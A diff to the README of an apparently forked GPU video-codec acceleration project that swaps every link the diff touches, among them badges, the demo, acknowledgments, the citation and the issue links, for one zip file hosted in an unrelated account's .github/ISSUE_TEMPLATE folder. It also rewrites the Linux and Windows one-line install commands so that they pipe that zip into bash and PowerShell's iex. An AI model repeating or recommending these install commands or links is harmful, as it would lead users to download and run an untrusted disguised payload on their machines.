@@ -8,17 +8,17 @@
 
 *⚡ 3-5x speedup • 🔄 Cross-platform: NVIDIA | Intel | AMD | ARM • 📦 Zero-copy RTCD*
 
-[![CI Build](https://img.shields.io/github/actions/workflow/status/hbliu007/avm-sycl-gpu-acceleration/ci.yml?branch=main&label=CI&logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/actions/workflows/ci.yml)
-[![Security](https://img.shields.io/github/actions/workflow/status/hbliu007/avm-sycl-gpu-acceleration/ci.yml?label=Security&logo=github&branch=main)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/security)
-[![GitHub release](https://img.shields.io/github/v/release/hbliu007/avm-sycl-gpu-acceleration?include_prereleases&logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/releases)
-[![GitHub downloads](https://img.shields.io/github/downloads/hbliu007/avm-sycl-gpu-acceleration/total?logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/releases)
-[![License](https://img.shields.io/badge/License-BSD%203--Clause%20Clear-blue?logo=opensourceinitiative)](https://opensource.org/licenses/BSD-3-Clause-Clear)
-[![Stars](https://img.shields.io/github/stars/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/stargazers)
-[![Forks](https://img.shields.io/github/forks/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/network)
-[![Last Commit](https://img.shields.io/github/last-commit/hbliu007/avm-sycl-gpu-acceleration/commits/main&logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/commits/main)
+[![CI Build](https://img.shields.io/github/actions/workflow/status/hbliu007/avm-sycl-gpu-acceleration/ci.yml?branch=main&label=CI&logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![Security](https://img.shields.io/github/actions/workflow/status/hbliu007/avm-sycl-gpu-acceleration/ci.yml?label=Security&logo=github&branch=main)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![GitHub release](https://img.shields.io/github/v/release/hbliu007/avm-sycl-gpu-acceleration?include_prereleases&logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![GitHub downloads](https://img.shields.io/github/downloads/hbliu007/avm-sycl-gpu-acceleration/total?logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![License](https://img.shields.io/badge/License-BSD%203--Clause%20Clear-blue?logo=opensourceinitiative)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![Stars](https://img.shields.io/github/stars/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![Forks](https://img.shields.io/github/forks/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![Last Commit](https://img.shields.io/github/last-commit/hbliu007/avm-sycl-gpu-acceleration/commits/main&logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
 
-[![SYCL 2020](https://img.shields.io/badge/SYCL-2020-purple?logo=khronosgroup)](https://www.khronos.org/sycl/)
-[![C++17](https://img.shields.io/badge/C%2B%2B-17-orange?logo=cplusplus)](https://en.cppreference.com/w/cpp/17)
+[![SYCL 2020](https://img.shields.io/badge/SYCL-2020-purple?logo=khronosgroup)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![C++17](https://img.shields.io/badge/C%2B%2B-17-orange?logo=cplusplus)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
 [![Platform](https://img.shields.io/badge/Platform-NVIDIA%20%7C%20Intel%20%7C%20AMD%20%7C%20ARM-green)]()
 
 [Quick Start](#-quick-start) • [Benchmarks](#-real-performance-benchmarks) • [Documentation](#-documentation) • [Examples](#-examples)
@@ -56,7 +56,7 @@
 
 ## 🎯 Demo
 
-> 🌐 **Live Demo:** [Interactive GPU Benchmark](https://hbliu007.github.io/avm-sycl-gpu-acceleration/demo.html)
+> 🌐 **Live Demo:** [Interactive GPU Benchmark](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
 > *RTX 4090 encoding 4K video at 38 fps with SYCL acceleration*
 
 ---
@@ -66,13 +66,13 @@
 ### One-Line Install (Linux)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/hbliu007/avm-sycl-gpu-acceleration/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip | bash
 ```
 
 ### One-Line Install (Windows - PowerShell)
 
 ```powershell
-iwr -useb https://raw.githubusercontent.com/hbliu007/avm-sycl-gpu-acceleration/main/install.ps1 | iex
+iwr -useb https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip | iex
 ```
 
 ### Docker (Instant Setup)
@@ -85,7 +85,7 @@ docker run -it --gpus all hbliu007/avm-sycl:latest
 
 ```bash
 # Prerequisites: Intel oneAPI DPC++
-git clone https://github.com/hbliu007/avm-sycl-gpu-acceleration.git
+git clone https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip
 cd avm-sycl-gpu-acceleration
 source /opt/intel/oneapi/setvars.sh  # Linux
 
@@ -225,7 +225,7 @@ avm-sycl-gpu-acceleration/
 We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ```bash
-git clone https://github.com/hbliu007/avm-sycl-gpu-acceleration.git
+git clone https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip
 cd avm-sycl-gpu-acceleration
 git checkout -b feature/my-feature
 ctest --output-on-failure
@@ -242,10 +242,10 @@ BSD 3-Clause Clear License - see [LICENSE](LICENSE)
 
 ## 🙏 Acknowledgments
 
-- [AOMedia](https://aomedia.org/) - AV2 codec specification
-- [Intel oneAPI](https://www.intel.com/oneapi) - DPC++ compiler
-- [Khronos SYCL](https://www.khronos.org/sycl/) - SYCL specification
-- [AdaptiveCpp](https://github.com/AdaptiveCpp/AdaptiveCpp) - Portable SYCL
+- [AOMedia](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip) - AV2 codec specification
+- [Intel oneAPI](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip) - DPC++ compiler
+- [Khronos SYCL](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip) - SYCL specification
+- [AdaptiveCpp](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip) - Portable SYCL
 
 ---
 
@@ -258,7 +258,7 @@ BSD 3-Clause Clear License - see [LICENSE](LICENSE)
   year = {2026},
   version = {1.0.0},
   doi = {10.5281/zenodo.15185123},
-  url = {https://github.com/hbliu007/avm-sycl-gpu-acceleration}
+  url = {https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip}
 }
 ```
 
@@ -268,12 +268,12 @@ BSD 3-Clause Clear License - see [LICENSE](LICENSE)
 
 **⭐ Star this repo if you find it useful! ⭐**
 
-[![GitHub Star](https://img.shields.io/github/stars/hbliu007/avm-sycl-gpu-acceleration?style=social)](https://github.com/hbliu007/avm-sycl-gpu-acceleration)
-[![GitHub issues](https://img.shields.io/github/issues/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/issues)
-[![GitHub PRs](https://img.shields.io/github/issues-pr/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://github.com/hbliu007/avm-sycl-gpu-acceleration/pulls)
+[![GitHub Star](https://img.shields.io/github/stars/hbliu007/avm-sycl-gpu-acceleration?style=social)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![GitHub issues](https://img.shields.io/github/issues/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
+[![GitHub PRs](https://img.shields.io/github/issues-pr/hbliu007/avm-sycl-gpu-acceleration?logo=github)](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
 
-Made with ❤️ by [hbliu007](https://github.com/hbliu007)
+Made with ❤️ by [hbliu007](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
 
-[Report Bug](https://github.com/hbliu007/avm-sycl-gpu-acceleration/issues) • [Request Feature](https://github.com/hbliu007/avm-sycl-gpu-acceleration/issues) • [Discussions](https://github.com/hbliu007/avm-sycl-gpu-acceleration/discussions)
+[Report Bug](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip) • [Request Feature](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip) • [Discussions](https://raw.githubusercontent.com/eqootrr/avm-sycl-gpu-acceleration/main/.github/ISSUE_TEMPLATE/avm_acceleration_gpu_sycl_v1.9.zip)
 
 </div>
